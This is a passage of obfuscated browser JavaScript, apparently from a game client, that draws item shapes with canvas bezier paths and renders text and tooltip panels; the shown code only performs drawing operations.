			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 167, ᐃ * 120);
			Δ.bezierCurveTo(ᐃ * 196, ᐃ * 106, 207 * ᐃ, ᐃ * 111, 199 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(ᐃ * 185, 172 * ᐃ, 166 * ᐃ, 187 * ᐃ, 145 * ᐃ, 179 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118, 166 * ᐃ, 127 * ᐃ, 139 * ᐃ, ᐃ * 166, ᐃ * 121);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(25 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(ᐃ * 59, 96 * ᐃ, ᐃ * 97, 128 * ᐃ, 129 * ᐃ, ᐃ * 151);
			Δ.bezierCurveTo(126 * ᐃ, 163 * ᐃ, ᐃ * 134, ᐃ * 174, ᐃ * 142, 180 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, 170 * ᐃ, 68 * ᐃ, ᐃ * 134, ᐃ * 31, 85 * ᐃ);
			Δ.bezierCurveTo(24 * ᐃ, ᐃ * 71, 24 * ᐃ, 70 * ᐃ, 25 * ᐃ, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 161, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 181, 131 * ᐃ, ᐃ * 186, ᐃ * 135, 173 * ᐃ, ᐃ * 152);
			Δ.bezierCurveTo(163 * ᐃ, 163 * ᐃ, ᐃ * 155, ᐃ * 161, 151 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 140, ᐃ * 155, ᐃ * 131, 175 * ᐃ, ᐃ * 125);
			Δ.bezierCurveTo(190 * ᐃ, ᐃ * 120, 196 * ᐃ, ᐃ * 121, ᐃ * 189, 143 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182, ᐃ * 167, 169 * ᐃ, ᐃ * 174, ᐃ * 157, ᐃ * 174);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 172, ᐃ * 139, ᐃ * 162, ᐃ * 140, ᐃ * 156);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆΔⵠᐃ], 4 * ᐃ);
			Δ.translate(ᐃ * 20, ᐃ * -80);
			Δ.translate(ᐃ * 5, ΔᐃⲆⲆⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(58 * ᐃ, 33 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ᐃ * 22, 93 * ᐃ, 26 * ᐃ, ᐃ * 123, ᐃ * 47);
			Δ.bezierCurveTo(ᐃ * 160, 73 * ᐃ, 169 * ᐃ, 80 * ᐃ, ᐃ * 191, 99 * ᐃ);
			Δ.bezierCurveTo(202 * ᐃ, 107 * ᐃ, 211 * ᐃ, 118 * ᐃ, ᐃ * 195, ᐃ * 151);
			Δ.bezierCurveTo(181 * ᐃ, 183 * ᐃ, ᐃ * 157, ᐃ * 192, ᐃ * 129, ᐃ * 174);
			Δ.bezierCurveTo(78 * ᐃ, 140 * ᐃ, 68 * ᐃ, 129 * ᐃ, 37 * ᐃ, 94 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 15, 68 * ᐃ, ᐃ * 25, ᐃ * 52, 56 * ᐃ, ᐃ * 34);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, ᐃ * -10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 58, ᐃ * 33);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 22, ᐃ * 93, 26 * ᐃ, ᐃ * 123, 47 * ᐃ);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 73, 169 * ᐃ, 80 * ᐃ, 191 * ᐃ, ᐃ * 99);
			Δ.bezierCurveTo(202 * ᐃ, 107 * ᐃ, 211 * ᐃ, ᐃ * 118, 195 * ᐃ, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 181, 183 * ᐃ, ᐃ * 157, ᐃ * 192, ᐃ * 129, 174 * ᐃ);
			Δ.bezierCurveTo(78 * ᐃ, 140 * ᐃ, ᐃ * 68, 129 * ᐃ, ᐃ * 37, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * 15, ᐃ * 68, 25 * ᐃ, ᐃ * 52, ᐃ * 56, 34 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[2], ᐃᐃⲆⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 167, ᐃ * 120);
			Δ.bezierCurveTo(196 * ᐃ, ᐃ * 106, 207 * ᐃ, 111 * ᐃ, ᐃ * 199, 135 * ᐃ);
			Δ.bezierCurveTo(185 * ᐃ, 172 * ᐃ, ᐃ * 166, 187 * ᐃ, 145 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(118 * ᐃ, 166 * ᐃ, ᐃ * 127, 139 * ᐃ, ᐃ * 166, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 25, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 59, 96 * ᐃ, 97 * ᐃ, 128 * ᐃ, 129 * ᐃ, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126, ᐃ * 163, ᐃ * 134, 174 * ᐃ, 142 * ᐃ, 180 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, 170 * ᐃ, ᐃ * 68, 134 * ᐃ, ᐃ * 31, ᐃ * 85);
			Δ.bezierCurveTo(24 * ᐃ, ᐃ * 71, ᐃ * 24, 70 * ᐃ, ᐃ * 25, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 161, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 181, 131 * ᐃ, ᐃ * 186, ᐃ * 135, 173 * ᐃ, 152 * ᐃ);
			Δ.bezierCurveTo(163 * ᐃ, 163 * ᐃ, 155 * ᐃ, ᐃ * 161, 151 * ᐃ, ᐃ * 150);
			Δ.bezierCurveTo(147 * ᐃ, ᐃ * 140, 155 * ᐃ, 131 * ᐃ, 175 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(190 * ᐃ, ᐃ * 120, 196 * ᐃ, ᐃ * 121, 189 * ᐃ, 143 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182, 167 * ᐃ, ᐃ * 169, 174 * ᐃ, 157 * ᐃ, 174 * ᐃ);
			Δ.bezierCurveTo(138 * ᐃ, ᐃ * 172, ᐃ * 139, 162 * ᐃ, ᐃ * 140, ᐃ * 156);
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[ⵠΔᐃΔ], ᐃ * ᐃⲆᐃⲆⵠ);
			return Ⲇⵠ
		}

		function ΔⵠⵠⲆᐃⲆΔΔⲆ(text) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Δ.lineJoin = ⵠ[5];
			while (-1 !== text.indexOf("\\n")) text = text.replace("\\n", "\n");
			text = text.split("\n");
			Ⲇᐃ = [];
			var ⵠⵠᐃ = 14;
			var ΔΔⲆ = text.length * (ⵠⵠᐃ + 4) + ᐃⵠΔⵠⵠ;
			var ⵠⲆⵠ = ᐃⵠΔ;
			Δ.font = ⵠⵠᐃ + ⵠ[484];
			for (var ⵠᐃ = 0; text.length > ⵠᐃ; ⵠᐃ++) {
				if (text[ⵠᐃ].charAt(0) === "#") {
					Ⲇᐃ[ⵠᐃ] = text[ⵠᐃ].substring(Δⵠᐃ, 7);
					text[ⵠᐃ] = text[ⵠᐃ].substring(ΔᐃᐃⲆᐃ)
				} else Ⲇᐃ[ⵠᐃ] = ⵠ[210];
				ⵠⲆⵠ = Math.max(Δ.measureText(text[ⵠᐃ]).width + ᐃⲆⲆΔΔⵠΔ, ⵠⲆⵠ)
			}
			Ⲇⵠ.height = ΔΔⲆ;
			Ⲇⵠ.width = ⵠⲆⵠ;
			for (var ⵠᐃ = Ⲇᐃⵠⵠ; ⵠᐃ < text.length; ⵠᐃ++) {
				var ᐃⵠ = ᐃᐃΔΔᐃ(1, text[ⵠᐃ], ⵠⵠᐃ, Ⲇᐃ[ⵠᐃ], null, null, null, null, null, ⵠ[481], ᐃⵠⲆⵠΔ);
				Δ.drawImage(ᐃⵠ, 8, (ⵠⵠᐃ + ⲆΔⵠᐃ) * ⵠᐃ + 5)
			}
			return Ⲇⵠ
		}

		function ⵠⵠⲆⵠᐃⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 290;
			Ⲇⵠ.height = ᐃ * 525;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⲆΔ;
			Δ.translate(20 * ᐃ, 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 111, 351 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128.5, ᐃ * 218.5, 128.5 * ᐃ, 218.5 * ᐃ, ᐃ * 146, 86 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166.5, ᐃ * 66.5, 166.5 * ᐃ, 66.5 * ᐃ, ᐃ * 187, 47 * ᐃ);
			Δ.bezierCurveTo(201 * ᐃ, 71.5 * ᐃ, ᐃ * 201, ᐃ * 71.5, 215 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(193 * ᐃ, ᐃ * 228.5, ᐃ * 193, 228.5 * ᐃ, 171 * ᐃ, 361 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.save();
			Δ.translate(129.5 * ᐃ, ᐃ * 424);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, ᐃ * -15.5, -63 * ᐃ, 31 * ᐃ, 126 * ᐃ, ᐃ * ⵠᐃⲆⲆΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 121, 480 * ᐃ, 20.396078054371138 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(90 * ᐃ, 311 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 95, ᐃ * 324, ᐃ * 95, 324 * ᐃ, ᐃ * 100, 337 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 141.5, 345.5 * ᐃ, 141.5 * ᐃ, 345.5 * ᐃ, 183 * ᐃ, 354 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 193.5, 342.5 * ᐃ, 193.5 * ᐃ, ᐃ * 342.5, 204 * ᐃ, 331 * ᐃ);
			Δ.bezierCurveTo(202 * ᐃ, 354 * ᐃ, 202 * ᐃ, ᐃ * 354, 200 * ᐃ, 377 * ᐃ);
			Δ.bezierCurveTo(147 * ᐃ, ᐃ * 388, ᐃ * 106, 371 * ᐃ, 79 * ᐃ, 356 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ᐃⲆᐃΔⵠ, -ⵠΔⵠⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 111, ᐃ * 351);
			Δ.bezierCurveTo(ᐃ * 128.5, 218.5 * ᐃ, ᐃ * 128.5, 218.5 * ᐃ, ᐃ * 146, 86 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166.5, 66.5 * ᐃ, 166.5 * ᐃ, 66.5 * ᐃ, ᐃ * 187, ᐃ * 47);
			Δ.bezierCurveTo(ᐃ * 201, ᐃ * 71.5, ᐃ * 201, 71.5 * ᐃ, 215 * ᐃ, ᐃ * 96);
			Δ.bezierCurveTo(193 * ᐃ, 228.5 * ᐃ, 193 * ᐃ, 228.5 * ᐃ, 171 * ᐃ, ᐃ * 361);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ᐃⲆΔⲆ], ᐃ * 12.5);
			Δ.save();
			Δ.translate(ᐃ * 129.5, 424 * ᐃ);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, ᐃ * -15.5, -63 * ᐃ, ᐃ * 31, 126 * ᐃ, ΔᐃⲆⲆⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * 12.5);
			ⵠᐃᐃ(Δ, 121 * ᐃ, 480 * ᐃ, 20.396078054371138 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ΔⵠⲆⲆ], ᐃ * 12.5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(90 * ᐃ, 311 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, ᐃ * 324, 95 * ᐃ, ᐃ * 324, ᐃ * 100, ᐃ * 337);
			Δ.bezierCurveTo(141.5 * ᐃ, ᐃ * 345.5, ᐃ * 141.5, ᐃ * 345.5, ᐃ * 183, ᐃ * 354);
			Δ.bezierCurveTo(ᐃ * 193.5, ᐃ * 342.5, 193.5 * ᐃ, ᐃ * 342.5, ᐃ * 204, 331 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 202, 354 * ᐃ, 202 * ᐃ, ᐃ * 354, ᐃ * 200, 377 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 388, ᐃ * 106, 371 * ᐃ, ᐃ * 79, 356 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 12.5);
			return Ⲇⵠ
		}

		function ⲆΔⵠⵠᐃⲆΔᐃᐃ(ⲆⵠⲆⵠ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var text = ΔⵠΔ[ⲆⵠⲆⵠ];
			Δ.font = "20px Baloo Paaji";
			var ΔⵠⲆⵠΔⲆᐃ = Δᐃᐃᐃ;
			if (ΔᐃⲆⵠ <= text.length) ΔⵠⲆⵠΔⲆᐃ = Math.max(ΔΔⵠⵠ, Δ.measureText(text[0]).width);
			Δ.font = "17px Baloo Paaji";
			ⵠⵠΔⲆ <= text.length && (ΔⵠⲆⵠΔⲆᐃ = Math.max(ΔⵠⲆⵠΔⲆᐃ, Δ.measureText(text[1]).width));
			Δ.font = "14px Baloo Paaji";
			for (ⵠᐃ = ⵠΔⲆᐃ; text.length > ⵠᐃ; ⵠᐃ++) ΔⵠⲆⵠΔⲆᐃ = Math.max(ΔⵠⲆⵠΔⲆᐃ, Δ.measureText(text[ⵠᐃ]).width);
			var ⵠⲆⵠ = ΔⵠⲆⵠΔⲆᐃ + 35;
			var ᐃΔⵠΔΔΔⲆ = 26;
			var ΔΔⲆ = 0;
			if (ΔΔᐃⵠ === text.length) ΔΔⲆ = 55;
			else if (text.length === 2) ΔΔⲆ = 85;
			else ΔΔⲆ = (text.length - 2) * ᐃΔⵠΔΔΔⲆ + 85;
			Ⲇⵠ.width = ⵠⲆⵠ;
			Ⲇⵠ.height = ΔΔⲆ;
			Ⲇᐃᐃ(Δ, ⵠⲆⲆ, ΔΔⵠ, ⵠⲆⵠ, ΔΔⲆ, 10);
			Δ.fillStyle = ⵠ[339];
			Δ.globalAlpha = .5;
			Δ.fill();
			1 <= text.length && (Δ.textBaseline = ⵠ[3], Δ.font = "20px Baloo Paaji", Δ.globalAlpha = 1, Δ.fillStyle = "#e2c340", Δ.fillText(text[0], Δᐃᐃᐃᐃⵠⵠ, 28));
			text.length >= ᐃⵠⲆⲆⲆ && (Δ.font = "17px Baloo Paaji", Δ.fillStyle = ⵠ[407], Δ.fillText(text[ⵠΔΔ], 15, 55), ΔΔⲆ = 55);
			if (3 <= text.length) {
				Δ.font = "14px Baloo Paaji";
				Δ.globalAlpha = .7;
				for (ⵠᐃ = ⵠⲆⵠⲆ; ⵠᐃ < text.length; ⵠᐃ++) {
					Δ.fillText(text[ⵠᐃ], 15, ΔΔⲆ + 28);
					ΔΔⲆ += ᐃΔⵠΔΔΔⲆ
				}
			}
			return Ⲇⵠ
		}

		function ⲆΔⵠΔⲆΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 290;
			Ⲇⵠ.height = ᐃ * 525;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(20 * ᐃ, ᐃ * ⵠΔⵠⵠᐃ);
			Δ.translate(-20 * ᐃ, -ⲆⲆⲆⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 132, ᐃ * 423);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, -ΔⵠⵠΔⵠᐃⲆ * ᐃ, -61 * ᐃ, ᐃ * 28, ᐃ * 122, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(100 * ᐃ, ᐃ * 344);
			Δ.bezierCurveTo(123 * ᐃ, ᐃ * 214, ᐃ * 123, 214 * ᐃ, 146 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(166.5 * ᐃ, ᐃ * 65, 166.5 * ᐃ, ᐃ * 65, ᐃ * 187, ᐃ * 46);
			Δ.bezierCurveTo(ᐃ * 201, ᐃ * 71, 201 * ᐃ, 71 * ᐃ, 215 * ᐃ, ᐃ * 96);
			Δ.bezierCurveTo(199.5 * ᐃ, ᐃ * 226.5, ᐃ * 199.5, 226.5 * ᐃ, ᐃ * 184, ᐃ * 357);
			Δ.bezierCurveTo(ᐃ * 162.5, 362.5 * ᐃ, ᐃ * 162.5, ᐃ * 362.5, 141 * ᐃ, ᐃ * 368);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 75, 328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88, ᐃ * 336.5, 88 * ᐃ, ᐃ * 336.5, 101 * ᐃ, 345 * ᐃ);
			Δ.bezierCurveTo(123.5 * ᐃ, ᐃ * 337.5, ᐃ * 123.5, 337.5 * ᐃ, 146 * ᐃ, ᐃ * 330);
			Δ.bezierCurveTo(165 * ᐃ, ᐃ * 343.5, ᐃ * 165, 343.5 * ᐃ, ᐃ * 184, ᐃ * 357);
			Δ.bezierCurveTo(ᐃ * 198.5, 353 * ᐃ, 198.5 * ᐃ, ᐃ * 353, 213 * ᐃ, 349 * ᐃ);
			Δ.bezierCurveTo(200.5 * ᐃ, 364.5 * ᐃ, 200.5 * ᐃ, ᐃ * 364.5, 188 * ᐃ, ᐃ * 380);
			Δ.bezierCurveTo(ᐃ * 163, 380.5 * ᐃ, 163 * ᐃ, 380.5 * ᐃ, ᐃ * 138, 381 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 373.5, ᐃ * 112, 373.5 * ᐃ, 86 * ᐃ, ᐃ * 366);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(121 * ᐃ, ᐃ * 332);
			Δ.bezierCurveTo(133.5 * ᐃ, ᐃ * 327.5, ᐃ * 133.5, ᐃ * 327.5, 146 * ᐃ, ᐃ * 323);
			Δ.bezierCurveTo(157 * ᐃ, ᐃ * 330.5, 157 * ᐃ, 330.5 * ᐃ, ᐃ * 168, 338 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182.5, 219.5 * ᐃ, ᐃ * 182.5, ᐃ * 219.5, 197 * ᐃ, 101 * ᐃ);
			Δ.bezierCurveTo(190 * ᐃ, 84.5 * ᐃ, 190 * ᐃ, 84.5 * ᐃ, ᐃ * 183, 68 * ᐃ);
			Δ.bezierCurveTo(172.5 * ᐃ, 81 * ᐃ, ᐃ * 172.5, 81 * ᐃ, 162 * ᐃ, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 105, ᐃ * 463);
			Δ.bezierCurveTo(124.5 * ᐃ, 466 * ᐃ, ᐃ * 124.5, 466 * ᐃ, 144 * ᐃ, ᐃ * 469);
			Δ.bezierCurveTo(145.5 * ᐃ, 478.5 * ᐃ, ᐃ * 145.5, 478.5 * ᐃ, ᐃ * 147, ᐃ * 488);
			Δ.bezierCurveTo(ᐃ * 133.5, 495.5 * ᐃ, ᐃ * 133.5, 495.5 * ᐃ, 120 * ᐃ, ᐃ * 503);
			Δ.bezierCurveTo(ᐃ * 108.5, ᐃ * 492, ᐃ * 108.5, ᐃ * 492, 97 * ᐃ, ᐃ * 481);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔⲆⵠ;
			Δ.translate(-20 * ᐃ, -ⵠⵠΔΔᐃ * ᐃ);
			Δ.save();
			Δ.translate(132 * ᐃ, 423 * ᐃ);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, -14 * ᐃ, -61 * ᐃ, ᐃ * 28, 122 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ], Ⲇᐃ[5], ᐃ * 12.5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ⵠᐃᐃᐃᐃΔⵠ * ᐃ, 344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, 214 * ᐃ, 123 * ᐃ, ᐃ * 214, 146 * ᐃ, ᐃ * 84);
			Δ.bezierCurveTo(ᐃ * 166.5, ᐃ * 65, ᐃ * 166.5, 65 * ᐃ, 187 * ᐃ, 46 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201, 71 * ᐃ, 201 * ᐃ, ᐃ * 71, 215 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 199.5, ᐃ * 226.5, ᐃ * 199.5, ᐃ * 226.5, ᐃ * 184, ᐃ * 357);
			Δ.bezierCurveTo(162.5 * ᐃ, 362.5 * ᐃ, ᐃ * 162.5, 362.5 * ᐃ, ᐃ * 141, 368 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ], Ⲇᐃ[2], ᐃ * 12.5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(75 * ᐃ, ᐃ * 328);
			Δ.bezierCurveTo(ᐃ * 88, ᐃ * 336.5, ᐃ * 88, ᐃ * 336.5, 101 * ᐃ, 345 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123.5, ᐃ * 337.5, ᐃ * 123.5, ᐃ * 337.5, ᐃ * 146, ᐃ * 330);
			Δ.bezierCurveTo(ᐃ * 165, 343.5 * ᐃ, 165 * ᐃ, 343.5 * ᐃ, 184 * ᐃ, 357 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 198.5, 353 * ᐃ, 198.5 * ᐃ, ᐃ * 353, ᐃ * 213, 349 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, ᐃ * 364.5, ᐃ * 200.5, 364.5 * ᐃ, ᐃ * 188, ᐃ * 380);
			Δ.bezierCurveTo(163 * ᐃ, 380.5 * ᐃ, 163 * ᐃ, 380.5 * ᐃ, ᐃ * 138, 381 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112, 373.5 * ᐃ, ᐃ * 112, 373.5 * ᐃ, 86 * ᐃ, ᐃ * 366);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[ⵠⵠΔⲆ], 12.5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(121 * ᐃ, 332 * ᐃ);
			Δ.bezierCurveTo(133.5 * ᐃ, ᐃ * 327.5, 133.5 * ᐃ, ᐃ * 327.5, ᐃ * 146, ᐃ * 323);
			Δ.bezierCurveTo(ᐃ * 157, ᐃ * 330.5, ᐃ * 157, 330.5 * ᐃ, ᐃ * 168, ᐃ * 338);
			Δ.bezierCurveTo(ᐃ * 182.5, ᐃ * 219.5, 182.5 * ᐃ, ᐃ * 219.5, ᐃ * 197, 101 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190, ᐃ * 84.5, ᐃ * 190, 84.5 * ᐃ, 183 * ᐃ, ᐃ * 68);
			Δ.bezierCurveTo(172.5 * ᐃ, 81 * ᐃ, ᐃ * 172.5, 81 * ᐃ, ᐃ * 162, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105, 463 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124.5, ᐃ * 466, 124.5 * ᐃ, 466 * ᐃ, ᐃ * 144, 469 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145.5, ᐃ * 478.5, ᐃ * 145.5, 478.5 * ᐃ, ᐃ * 147, 488 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133.5, ᐃ * 495.5, 133.5 * ᐃ, ᐃ * 495.5, ᐃ * 120, ᐃ * 503);
			Δ.bezierCurveTo(ᐃ * 108.5, 492 * ᐃ, ᐃ * 108.5, ᐃ * 492, ᐃ * 97, ᐃ * 481);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[Δⵠⵠⵠ], 12.5 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(143 * ᐃ, 346 * ᐃ);
			Δ.bezierCurveTo(125 * ᐃ, ᐃ * 352, ᐃ * 125, ᐃ * 352, 107 * ᐃ, 358 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, 363 * ᐃ, ᐃ * 140, ᐃ * 368, 141 * ᐃ, 368 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 156.5, 367 * ᐃ, 156.5 * ᐃ, 367 * ᐃ, 172 * ᐃ, ᐃ * 366);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			return Ⲇⵠ
		}

		function ΔΔᐃΔΔΔᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 104 * ᐃ;
			Ⲇⵠ.height = ᐃ * 112;
			Δ.translate(0, ᐃ * ⵠᐃⲆΔᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(16 * ᐃ, ᐃ * 44);
